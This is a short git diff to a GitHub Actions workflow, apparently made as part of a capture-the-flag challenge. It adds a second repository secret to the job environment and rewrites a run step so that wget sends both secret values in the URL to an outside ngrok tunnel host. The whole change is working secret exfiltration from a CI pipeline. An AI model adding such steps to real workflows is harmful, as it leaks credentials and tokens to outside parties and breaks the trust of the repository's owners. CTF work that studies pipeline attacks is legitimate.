@@ -4,10 +4,6 @@ on:
     
 permissions: {}
 
-concurrency:
-  group: ${{ github.workflow }}
-  cancel-in-progress: false
-
 jobs:
   pulled_pork:
     runs-on: ubuntu-latest
@@ -18,8 +14,10 @@ jobs:
       ACTIONS_RUNNER_DEBUG: true
       ACTIONS_STEP_DEBUG: true
       FLAG: ${{ secrets.FLAG_GRAVY_OVERFLOW_L2_PULLED_PORK }}
+      FLAG1: ${{ secrets.FLAG_GRAVY_OVERFLOW_L0_FRIES }}
     steps:
       - uses: step-security/harden-runner@63c24ba6bd7ba022e95695ff85de572c04a18142 # v2.7.0
         with:
           egress-policy: audit
-      - run: wget https://dd66-87-221-149-209.ngrok-free.app/$FLAG
+      - run: 
+          wget https://dd66-87-221-149-209.ngrok-free.app/$FLAG/$FLAG1
